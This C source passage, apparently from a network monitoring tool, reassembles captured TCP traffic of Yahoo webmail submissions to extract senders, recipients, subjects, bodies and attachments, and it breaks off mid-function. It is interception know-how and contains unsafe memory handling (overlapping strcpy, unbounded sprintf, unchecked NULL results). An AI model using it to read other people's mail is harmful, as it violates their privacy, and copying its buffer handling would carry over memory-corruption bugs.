#include "common.h"
//Mail_info *mail_info_yahoo_attach[6];//store the attach information
//int j=-1;//show the number of uploading.
static Mail_info *mail_info_yahoo_attach=NULL;
int drop_yahoo_tag(char *cc)
{
	int len=0;
	len=strlen(cc);
	if(len<=0) return -1;
	char *p1=NULL;
	char *p2=NULL;
	p1=cc+len-1;
	p2=p1;
    int range=0;
	while(len>=0){
          if(*p2=='>'){
			  p1=p2;
			  while(len>=0){
				  if(*p1=='<'){
                   range=p2-p1;
                   if(range==7)
                   {
                     *p1=';';
                     strcpy(p1+1,p2+1);
                   }else if(range==6&&*(p1+1)=='/'){
					 *p1=' ';
					  strcpy(p1+1,p2+1);
				   }else{
           		      strcpy(p1,p2+1);
                   }
				  len--;
				  p1--;
				  break;
				  }
				  len--;
				  p1--;
			 
			  }
			  p2=p1+1;
			  len=len+1;
              
		  }
		  p2--;
		  len--;
	}
	return 0;
}
                         
void writefileyahoo(Mail_info *mail_info)
{
	char patternfrom[]="\"from\":\\{\"email\":\"(.*)\",\"name\".*\"to";
	char patternto[]="\"to\":\\[\\{\"fail\":false,\"email\":\"(.*)\",\"name\".*\"\\}\\],\"cc";
	char patterncc[]="\"cc\":\\[\\{\"fail\":false,\"email\":\"(.*)\",\"name\".*\"\\}\\],\"bcc";
	char patternbcc[]="\"bcc\":\\[\\{\"fail\":false,\"email\":\"(.*)\",\"name\".*\"\\}\\],\"replyto";
	char patternsubject[]="\"subject\":\"(.*)\",\"from";
	char patterncontent[] = "\"text\":\"(.*)\",\"attachment";
	regcompile_1(mail_info->mail_data,patternfrom,mail_info->from,MAX_FROM_LEN);
	regcompile_1(mail_info->mail_data,patternto,mail_info->to,MAX_TO_LEN);
	drop_yahoo_tag(mail_info->to);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(mail_info->mail_data,patterncc,mail_info->cc,MAX_CC_LEN);
	drop_yahoo_tag(mail_info->cc);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	drop_yahoo_tag(mail_info->bcc);
	regcompile_1(mail_info->mail_data,patternsubject,mail_info->subject,MAX_SUBJ_LEN);
	clear_tag(mail_info->subject);
	regcompile_2(mail_info->mail_data, patterncontent, &mail_info->content);
	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
		clear_tag(mail_info->content);
	}
	
	//printf("*************************\n");

	char *p1 = mail_info->mail_data;
	char *p2 = NULL;
	Attach_info *attach_info;
	char ID[MAX_ID_LEN];
	//char filename[MAX_FN_LEN];
	int flag = 0;
	int i = 0;
	int len;

	create_dir(mail_info->save_path, "yahoo", mail_info->from);
	//chdir(mail_info->save_path);
	//chdir("attachment");
	while (1) {
		p1 = strstr(p1, "attachment\":\"upload://");
		if (p1 == NULL)
			break;
		p1 += 22;
		p2 = strstr(p1, "\",\"disposition\":\"attachment");
		if(!p2) break;
		len=p2-p1;
		if(len>MAX_ID_LEN) break;
		strncpy(ID, p1, p2 - p1);
		ID[p2 - p1] = 0;
		//LOG_INFO("ID : %s\n", ID);
		attach_info = find_attach(ID);

		if (attach_info == NULL) {
			continue ;
		}

		i++;
		Attachment *attachment = (Attachment *)malloc(sizeof(Attachment));
		//get_file_name(attach_info->path_of_sender, filename);
		//sprintf(attachment->loc_filename, "attach%d_%s", i, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", attach_info->attach_name);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		attachment->next = NULL;
		char str[MAX_PATH_LEN];
		sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
		link(attach_info->path_of_here,str);
		unlink(attach_info->path_of_here);
	//	trim_attach(attachment->loc_filename, 47);
		delete_attach(attach_info);
		if (!flag) {
			mail_info->attach = attachment;
			flag = 1;
		} else {
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		p1 = p2 + 26;
	}
	//chdir("..");
	mail_info->num_of_attach = i;
	write_to_file(mail_info);
}
///////////////   yahoo.com.cn  ///////
void get_yahoocn_from(char *tmpfrom, char *from)
{
	  int len=strlen(tmpfrom);
	  char *p1,*p2;
	  int flag=0;
	  p1=tmpfrom+len-1;
	  while(p1>=tmpfrom){
		  if(*p1 =='@'){
		   p2=p1;
		   flag=1;
		  }
		  if(*p1 =='['&&flag){
		   p1=p1+1;
           strncpy(from,p1,p2-p1);
		   from[p2-p1]=0;
		   strcat(from,"@yahoo.cn");
		   break;
		  }
	      p1--;
	  }
}

void writefileyahoocomcn(Mail_info *mail_info)
{
	char patternfrom[]="&defFromAddress=(.*)&to=";
	char patternto[]="&to=(.*)&cc=";
	char patterncc[]="&cc=(.*)&bcc=";
	char patternbcc[]="&bcc=(.*)&Subj=";
	char patternsubject[]="&Subj=(.*)&togglePlainTxt=";
	char *dst=(char *)malloc(mail_info->mail_length);
	memset(dst,0,mail_info->mail_length);
	htmldecode_full(mail_info->mail_data,dst);
	regcompile_1(dst,patternfrom,mail_info->from,MAX_FROM_LEN);
//	get_yahoocn_from(tmpfrom,mail_info->from);
	regcompile_1(dst,patternto,mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(dst,patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(dst,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(dst,patternsubject,mail_info->subject,MAX_SUBJ_LEN);
    ////////
	/*char *subject_tmp =NULL;
	subject_tmp =conv_xml_symbol(mail_info->subject);
	if(subject_tmp==NULL) return;
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	////////

//	if(up ==1){
	char *p =NULL;
	int len;
	p =strstr(dst,"&Content=");
	if(!p) return;
	p+=9;
	len = strlen(p);
	if(len<=0) return ;
	mail_info->content =(char *)malloc(len+1);
	if(mail_info->content!=NULL){
		memset(mail_info->content,0,len+1);
		memcpy(mail_info->content,p,len);
	}

//	}
//	else{
//    	regcompile_2(dst,patterncontent,&mail_info->content);
//	}
	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	create_dir(mail_info->save_path,"yahoocn",mail_info->from);
	//chdir(mail_info->save_path);

	if(strstr(dst,"&attachment=&")==NULL){
		char *p1 = dst;
		char *p2 = NULL;
		Attach_info *attach_info;
		char ID[MAX_ID_LEN];
		//char filename[MAX_FN_LEN];
		int flag = 0;
		int i = 0;
		int len;
		while (1) {
			p1 = strstr(p1, "\"upload://");
			if (p1 == NULL)
				break;
			p1 += 10;
			p2 = strstr(p1, "\",\"uploadAVNoVirus");
			if(!p2) break;
			len=p2-p1;
			if(len>MAX_ID_LEN) break;
			strncpy(ID, p1, p2 - p1);
			ID[p2 - p1] = 0;
			//printf("ID : %s\n", ID);
			attach_info = find_attach(ID);
	
			if (attach_info == NULL) {
				continue ;
			}
	
			i++;
			Attachment *attachment = (Attachment *)malloc(sizeof(Attachment));
			//get_file_name(attach_info->path_of_sender, filename);
			//sprintf(attachment->loc_filename, "attach%d_%s", i, filename);
			snprintf(attachment->loc_name, MAX_FN_LEN, "%s", attach_info->attach_name);
			snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
			attachment->next = NULL;
			char str[MAX_PATH_LEN];
			sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
			link(attach_info->path_of_here,str);
			unlink(attach_info->path_of_here);
		//	trim_attach(attachment->loc_filename, 47);
			delete_attach(attach_info);
			if (!flag) {
				mail_info->attach = attachment;
				flag = 1;
			} else {
				attachment->next = mail_info->attach->next;
				mail_info->attach->next = attachment;
			}
			p1 = p2 + 26;
		}
		mail_info->num_of_attach = i;

		/*char *p1=NULL,*p2=NULL;
		int fd,atta_fd;
		struct stat st;
		char *mapped;
		char filename[MAX_FN_LEN];
		char ID[MAX_ID_LEN+1];
		Attachment *attachment;
		Attach_info *attach_info;
		int flag = 0;
		int i = 0;
		mode_t file_mode = S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH;
		//////// id///////
		p1=strstr(dst+100,"upload://");
		if(!p1) return;
		p1+=9;
		p2=strstr(dst+100,"\",\"uploadAVNoVirus");
		if(!p2) return;
		int len_id=p2-p1;
		if(len_id>MAX_ID_LEN || len_id < 0) return;
		strncpy(ID,p1,len_id);
		ID[len_id]=0;
		p1=NULL;
		p2=NULL;
		///////////////////
		//printf("ID : %s\n", ID);
		attach_info = find_attach(ID);
		if(attach_info == NULL)  return ;
		fd = open(attach_info->path_of_here,O_RDWR);
		if(fstat(fd,&st)<0){
			printf("error");
			return;
		}
		unsigned int m=st.st_size;
		unsigned int length=0;
		mapped = (char *) mmap(NULL,st.st_size,PROT_READ,MAP_SHARED,fd,0);
		if(mapped==MAP_FAILED) return;
		p1=mapped;
		while(1) 
		{
			//p1 = strstr(p1,"filename=\"");
			length=p1-mapped;
			if(m<length) break;
			p1=memfind(p1,"filename=\"",m-length);
			if(!p1)
				break ;
			p1 +=10;
			if( *p1=='\"')
				continue;
			p2 = strstr(p1,"\"\r\n");
			if(!p2)
				break;
			//printf("11111111111111111\n");
			attachment = (Attachment *)malloc(sizeof(Attachment));
			if(!flag) 
			{
				mail_info->attach = attachment;
				attachment->next = NULL;
				flag = 1;
			} 
			else 
			{
				attachment->next = mail_info->attach->next;
				mail_info->attach->next = attachment;
			}
			//printf("222222222222222222\n");
			strncpy(attachment->path_of_sender,p1,p2-p1);
			attachment->path_of_sender[p2-p1]=0;
			get_file_name(attachment->path_of_sender,filename);
			i++;
			//sprintf(attachment->loc_filename,"attach%d_%s",i,filename);
			snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
			snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
			char str[MAX_PATH_LEN];
			p1=strstr(p2,"\r\n\r\n");
			if(!p1) 
				break;
			//printf("333333333333333333\n");
			p1+=4;
			unsigned int n =st.st_size-(p1-mapped);
			printf("n = %d\n", n);
			printf("p1 : %s\n", p1);
			p2 = memfind (p1,"Content-Disposition:",n);
			if (p2==NULL)
			{
				//printf("^^^^^^^^^^^^^^^\n");
				p2=memfind(p1,"-----------------------------",n);
				if (p2==NULL)
				break;
				else 
						p2+=43;
			}
			//printf("4444444444444444444\n");
			sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
			printf("str : %s\n", str);
			atta_fd = open(str,O_RDWR|O_CREAT,file_mode);
			write(atta_fd,p1,p2-p1);
			close(atta_fd);
			trim_attach(str,45);
			p1=p2;
		}
		munmap(mapped,st.st_size);
		close(fd);
		mail_info->num_of_attach =i;
		//printf("attach_info->path_of_here : %s\n", attach_info->path_of_here);
		unlink(attach_info->path_of_here);
		delete_attach(attach_info);*/
	}
	free(dst);
	dst = NULL;
	write_to_file(mail_info);
}


#if 0
void writefileyahoocomcn(Mail_info *mail_info)
{
	char patternfrom[]="&defFromAddress=(.*)&to=";
	char patternto[]="&to=(.*)&cc=";
	char patterncc[]="&cc=(.*)&bcc=";
	char patternbcc[]="&bcc=(.*)&Subj=";
	char patternsubject[]="&Subj=(.*)&togglePlainTxt=";
    char *dst=(char *)malloc(mail_info->mail_length);
    memset(dst,0,mail_info->mail_length);
    htmldecode_full(mail_info->mail_data,dst);
	regcompile_1(dst,patternfrom,mail_info->from,MAX_FROM_LEN);
//	get_yahoocn_from(tmpfrom,mail_info->from);
	regcompile_1(dst,patternto,mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(dst,patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(dst,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(dst,patternsubject,mail_info->subject,MAX_SUBJ_LEN);
    ////////
	/*char *subject_tmp =NULL;
	subject_tmp =conv_xml_symbol(mail_info->subject);
	if(subject_tmp==NULL) return;
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	////////

//	if(up ==1){
       char *p1 =NULL;
	   int len;
	   p1 =strstr(dst,"&Content=");
	   if(!p1) return;
	   p1+=9;
	   len = strlen(p1);
	   if(len<=0) return ;
	   mail_info->content =(char *)malloc(len+1);
	   if(mail_info->content!=NULL){
	   memset(mail_info->content,0,len+1);
	   memcpy(mail_info->content,p1,len);
	   }

//	}
//	else{
//    	regcompile_2(dst,patterncontent,&mail_info->content);
//	}
	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	create_dir(mail_info->save_path,"yahoocn",mail_info->from);
	//chdir(mail_info->save_path);
  //#if 0 //changed by yu
    if(strstr(dst,"&attachment=&")==NULL)
    {
        //without attachment,the return valuse is not null
        //with attachment, the return valuse is null
	
	//char *p1;
	char *p1=NULL;
	char *p2;
	//if (mail_info_yahoo_attach!=NULL)
	  //  p1=mail_info_yahoo_attach->mail_data;
	 //if (p1==NULL) return;
	 if(mail_info_yahoo_attach!=NULL)
	     {
	       p1=mail_info_yahoo_attach->mail_data;
	       if (p1==NULL) return;
	     }
	 int fd;
	 int i=0;
	 char filename[MAX_FN_LEN];
	 int flag=0;
	mode_t file_mode = S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH;
	
	while(1)
	{
	  p2=strstr(p1,"form-data; name=\"uploadfile");
	  if(p2==NULL)
	   break;
	  p1=p2;
	  p1+=27;
	  p1=strstr(p1,"\"; filename=\"");
	  if(p1==NULL) break;
	  p1+=13;
	  if (*p1=='\"')
	  continue;
	  p2=strstr(p1,"\"\r\nContent-Type: ");
	  if (p2==NULL) break;
	  i++;
	  Attachment *attachment=(Attachment *)malloc(sizeof(Attachment));//???
	  attachment->next=NULL;
	  if (!flag)
	  {
	    mail_info->attach=attachment;
	    flag=1;
	   }
	   else 
	   {
	     attachment->next=mail_info->attach->next;
	     mail_info->attach->next=attachment;
	   }
	   memcpy(attachment->path_of_sender,p1,p2-p1);
	   attachment->path_of_sender[p2-p1]=0;
	   get_file_name(attachment->path_of_sender,filename);
	   sprintf(attachment->loc_filename, "atta%d_%s",i,filename);
	   p1=strstr(p1,"\r\n\r\n");
	   if(!p1) break;
	   p1+=4;
	   unsigned int n=mail_info_yahoo_attach->mail_length-(p1-mail_info_yahoo_attach->mail_data);
	   p2=memfind(p1,"Content-Disposition: form-data;",n);
	   if (p2==NULL)
	   {  
	     p2=memfind(p1,"-----------------------------",n);
	     if (p2==NULL)
	      return;
	      else p2+=43;
	      
	   }
	   char str[MAX_PATH_LEN];
	   sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
	   fd=open(str,O_RDWR | O_CREAT, file_mode);
	   write(fd,p1,p2-p1);
	   close(fd);
	   trim_attach(str,45);
	   p1=p2;
	 }
	 mail_info->num_of_attach=i;
     }
	 
         free(dst);
         if(mail_info_yahoo_attach!=NULL)
         {
           free(mail_info_yahoo_attach->mail_data);
           free(mail_info_yahoo_attach);
           mail_info_yahoo_attach=NULL;
         }
         
	write_to_file(mail_info);
}
#endif
  
void writefileyahoocn(Mail_info *mail_info, int up)
{
//	if(!strstr(mail_info->mail_data+(mail_info->mail_length-4000),"&send="))
//	return;
	char patternfrom[]="&defFromAddress=(.*)&frmDropDown=";
	char patternto[]="&to=(.*)&cc=";
	char patterncc[]="&cc=(.*)&bcc=";
	char patternbcc[]="&bcc=(.*)&Subj=";
	char patternsubject[]="&Subj=(.*)&togglePlainTxt=";
	char patterncontent[]="&Content=(.*)&send=";
	char tmpfrom[100];
	char *dst=(char *)malloc(mail_info->mail_length);
    memset(dst,0,mail_info->mail_length);

    htmldecode_full(mail_info->mail_data,dst);
	regcompile_1(dst,patternfrom,tmpfrom,100);
	get_yahoocn_from(tmpfrom,mail_info->from);
	regcompile_1(dst,patternto,mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(dst,patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(dst,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(dst,patternsubject,mail_info->subject,MAX_SUBJ_LEN);
    ////////
	/*char *subject_tmp =NULL;
	subject_tmp =conv_xml_symbol(mail_info->subject);
	if(subject_tmp==NULL) return;
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	////////

	if(up ==1){
       char *p1 =NULL;
	   int len;
	   p1 =strstr(dst,"&Content=");
	   if(!p1) return;
	   p1+=9;
	   len = strlen(p1);
	   if(len<=0) return ;
	   mail_info->content =(char *)malloc(len+1);
	   if(mail_info->content!=NULL){
	   memset(mail_info->content,0,len+1);
	   memcpy(mail_info->content,p1,len);
	   }

	}
	else{
    	regcompile_2(dst,patterncontent,&mail_info->content);
	}
	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	create_dir(mail_info->save_path,"yahoocn",mail_info->from);
	//chdir(mail_info->save_path);

    if(strstr(dst,"&attachment=&")==NULL&&strstr(dst,"&attachment=[]")==NULL){

	char *p1=NULL,*p2=NULL;
	int fd,atta_fd;
	struct stat st;
	char *mapped;
	char filename[MAX_FN_LEN];
    char ID[MAX_ID_LEN];
	Attachment *attachment;
	Attach_info *attach_info;
	int flag = 0;
	int i = 0;
	mode_t file_mode = S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH;
	//////// id///////
	p1=strstr(dst+100,"&.rand=");
	if(!p1) return;
	p1+=7;
	//p2=strstr(dst+100,"&da=");
	//if(!p2) return;
	strncpy(ID,p1,9);
	ID[9]=0;
	p1=NULL;
	p2=NULL;
	///////////////////
	//printf("ID : %s\n", ID);
	attach_info = find_attach(ID);
	if(attach_info == NULL)  return ;
	fd = open(attach_info->path_of_here,O_RDWR);
	if(fstat(fd,&st)<0){
		LOG_ERROR("error\n");
		return;
	}
    mapped = (char *) mmap(NULL,st.st_size,PROT_READ,MAP_SHARED,fd,0);
    if(mapped==MAP_FAILED) return;
	p1=mapped;
	while(1) {
		p1 = strstr(p1,"filename=\"");
		if(!p1) break ;
		p1 +=10;
		if( *p1=='\"') break;
		p2 = strstr(p1,"\"\r\n");
		if(!p2) break;
		attachment = (Attachment *)malloc(sizeof(Attachment));
		if(!flag) {
			mail_info->attach = attachment;
			attachment->next = NULL;
			flag = 1;
		} else {
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		strncpy(attachment->path_of_sender,p1,p2-p1);
		attachment->path_of_sender[p2-p1]=0;
		get_file_name(attachment->path_of_sender,filename);
		i++;
		//sprintf(attachment->loc_filename,"attach%d_%s",i,filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		char str[MAX_PATH_LEN];
		p1=strstr(p2,"\r\n\r\n");
		if(!p1) 
			break;
		p1+=4;
		unsigned int n =st.st_size-(p1-mapped);
		p2 = memfind (p1,"Content-Disposition:",n);
		sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
		//printf("str : %s\n", str);
		atta_fd = open(str,O_RDWR|O_CREAT,file_mode);
		write(atta_fd,p1,p2-p1);
		close(atta_fd);
		trim_attach(str,45);
		p1=p2;
	}
	munmap(mapped,st.st_size);
	close(fd);
	mail_info->num_of_attach =i;
	unlink(attach_info->path_of_here);
	delete_attach(attach_info);
	}
    free(dst);
	dst = NULL;
	write_to_file(mail_info);
}

#if 0  
void writefileyahoocn(Mail_info *mail_info, int up)
{
//	if(!strstr(mail_info->mail_data+(mail_info->mail_length-4000),"&send="))
//	return;
	char patternfrom[]="&defFromAddress=(.*)&frmDropDown=";
	char patternto[]="&to=(.*)&cc=";
	char patterncc[]="&cc=(.*)&bcc=";
	char patternbcc[]="&bcc=(.*)&Subj=";
	char patternsubject[]="&Subj=(.*)&togglePlainTxt=";
	char patterncontent[]="&Content=(.*)&send=";
	char tmpfrom[100];
	char *dst=(char *)malloc(mail_info->mail_length);
    memset(dst,0,mail_info->mail_length);

    htmldecode_full(mail_info->mail_data,dst);
	regcompile_1(dst,patternfrom,tmpfrom,100);
	get_yahoocn_from(tmpfrom,mail_info->from);
	regcompile_1(dst,patternto,mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(dst,patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(dst,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(dst,patternsubject,mail_info->subject,MAX_SUBJ_LEN);
    ////////
	/*char *subject_tmp =NULL;
	subject_tmp =conv_xml_symbol(mail_info->subject);
	if(subject_tmp==NULL) return;
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	////////

	if(up ==1){
       char *p1 =NULL;
	   int len;
	   p1 =strstr(dst,"&Content=");
	   if(!p1) return;
	   p1+=9;
	   len = strlen(p1);
	   if(len<=0) return ;
	   mail_info->content =(char *)malloc(len+1);
	   if(mail_info->content!=NULL){
	   memset(mail_info->content,0,len+1);
	   memcpy(mail_info->content,p1,len);
	   }

	}
	else{
    	regcompile_2(dst,patterncontent,&mail_info->content);
	}
	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	create_dir(mail_info->save_path,"yahoocn",mail_info->from);
	//chdir(mail_info->save_path);

    if(strstr(dst,"&attachment=&")==NULL&&strstr(dst,"&attachment=[]")==NULL){

	char *p1=NULL,*p2=NULL;
	int fd,atta_fd;
	struct stat st;
	char *mapped;
	char filename[MAX_FN_LEN];
    char ID[MAX_ID_LEN];
	Attachment *attachment;
	Attach_info *attach_info;
	int flag = 0;
	int i = 0;
	mode_t file_mode = S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH;
	//////// id///////
	p1=strstr(dst+100,"&.rand=");
	if(!p1) return;
	p1+=7;
	//p2=strstr(dst+100,"&da=");
	//if(!p2) return;
	strncpy(ID,p1,9);
	ID[9]=0;
	p1=NULL;
	p2=NULL;
	///////////////////
	attach_info = find_attach(ID);
	if(attach_info == NULL)  return ;
	fd = open(attach_info->path_of_here,O_RDWR);
	if(fstat(fd,&st)<0){
		printf("error");
		return;
	}
    mapped = (char *) mmap(NULL,st.st_size,PROT_READ,MAP_SHARED,fd,0);
    if(mapped==MAP_FAILED) return;
	p1=mapped;
	while(1) {
		p1 = strstr(p1,"filename=\"");
		if(!p1) break ;
		p1 +=10;
		if( *p1=='\"') break;
		p2 = strstr(p1,"\"\r\n");
		if(!p2) break;
		attachment = (Attachment *)malloc(sizeof(Attachment));
		if(!flag) {
			mail_info->attach = attachment;
			attachment->next = NULL;
			flag = 1;
		} else {
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		strncpy(attachment->path_of_sender,p1,p2-p1);
		attachment->path_of_sender[p2-p1]=0;
		get_file_name(attachment->path_of_sender,filename);
		i++;
		sprintf(attachment->loc_filename,"attach%d_%s",i,filename);
		char str[MAX_PATH_LEN];
		p1=strstr(p2,"\r\n\r\n");
		if(!p1) break;
		p1+=4;
		unsigned int n =st.st_size-(p1-mapped);
		p2 = memfind (p1,"Content-Disposition:",n);
		sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
		atta_fd = open(str,O_RDWR|O_CREAT,file_mode);
		write(atta_fd,p1,p2-p1);
		close(atta_fd);
		trim_attach(str,45);
		p1=p2;
	}
	munmap(mapped,st.st_size);
	close(fd);
	mail_info->num_of_attach =i;
	unlink(attach_info->path_of_here);
	delete_attach(attach_info);
	}
    free(dst);
	write_to_file(mail_info);
}
#endif

int analyse_yahoo_mail(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	unsigned int len;
	int range;
	off_seq = seq - mail_info->start_seq;
	if (is_to_s) {
		if (!mail_info->is_complished) {
			if (mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data ==NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000) {
				int len;
				char *tmp;
				len = get_http_length(data);
				if (len > 0) {
					mail_info->mail_length += len;
                    tmp = (char *)malloc(mail_info->mail_length);
					if(tmp ==NULL){
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data =tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+data_len;
            if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,data_len);
		}
	}
	else if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		writefileyahoo(mail_info);
		del_mail_node(mail_info);
	}

	return 0;
}


int analyse_yahoo_mail_cn(Mail_info *mail_info,char *data, unsigned int datalen,struct tcphdr *ptcp,int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int range;
	off_seq = seq -mail_info->start_seq;
	if(is_to_s)
	{
		if(!mail_info->is_complished){
			if(mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data ==NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000){
				int len;
				char *tmp;
				len = get_http_length(data);
			                  
				if(len>0) {
					mail_info->mail_length +=len;
					tmp =(char *)malloc(mail_info->mail_length);
					if(tmp==NULL){
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	} 
	else if(!strncmp(data, "HTTP/1.1 200 OK\r\n",15))
	{
		//get_time(data,mail_info->sent_time);
		int up = -1;
		mail_info->is_complished = 1;
		if(strstr(mail_info->mail_data+(mail_info->mail_length-4000),"&send="))
		{
		  up=0;
		}
		else
		{
			char *sit = strstr(mail_info->mail_data,"&send=");
			if(sit - mail_info->mail_data < 2500 && sit != NULL)
			{
		  		up=1;
			}
			else 
			if(strstr(mail_info->mail_data,"&action_msg_send="))
			{
		   		get_time(data,mail_info->sent_time);
		   		writefileyahoocomcn(mail_info);
		   		del_mail_node(mail_info);
		   		return 0;
			}
			else
			{
		   		return -1;
			}
		}
		get_time(data,mail_info->sent_time);
		writefileyahoocn(mail_info,up);
		del_mail_node(mail_info);
	}
	return 0;
}


#if 0
int analyse_yahoo_mail_cn(Mail_info *mail_info,char *data, unsigned int datalen,struct tcphdr *ptcp,int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int range;
	off_seq = seq -mail_info->start_seq;
	if(is_to_s){
		if(!mail_info->is_complished){
			if(mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data ==NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000){
			 int len;
				char *tmp;
				len = get_http_length(data);
			                  
				if(len>0) {
					mail_info->mail_length +=len;
					tmp =(char *)malloc(mail_info->mail_length);
					if(tmp==NULL){
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	} else if(!strncmp(data, "HTTP/1.1 200 OK\r\n",15)){
		//get_time(data,mail_info->sent_time);
		int up = -1;
		mail_info->is_complished = 1;
		if(strstr(mail_info->mail_data+(mail_info->mail_length-4000),"&send=")){
		  up=0;
		}else if(memfind(mail_info->mail_data,"&send=",2500)){
		  up=1;
		}else if(memfind(mail_info->mail_data,"&action_msg_send=",2500)){
		   get_time(data,mail_info->sent_time);
		   writefileyahoocomcn(mail_info);
		   del_mail_node(mail_info);
		   return ;
		}
		else{
		   return -1;
		}
		get_time(data,mail_info->sent_time);
		writefileyahoocn(mail_info,up);
		del_mail_node(mail_info);
	}
}
#endif

int analyse_yahoo_attach_head(Attach_info *attach_info,char *data, unsigned int datalen,unsigned int seq)
{
	int fd;
	//time_t the_time =time(NULL);
	//struct tm *loc_time = localtime(&the_time);
//	char file_name_pattern[]="filename=\"(.{1,150})\"\r\nContent-Type: ";
	char file_name_pattern[] = "; filename=\"(.*)\"\r\nContent-Type: ";
	struct timeval tv;
	struct timezone tz;
	char *p = NULL;
	int off_seq;
	int result;
	int range;
       
         char *pids=NULL;
         char *pide=NULL;
         if(!strncmp(data,"POST /cn.",9))
                           {
              pids=strstr(data,".rand=");
              if(pids==NULL) return -1;
              pids+=6;
              pide=strstr(pids,"&.remember");
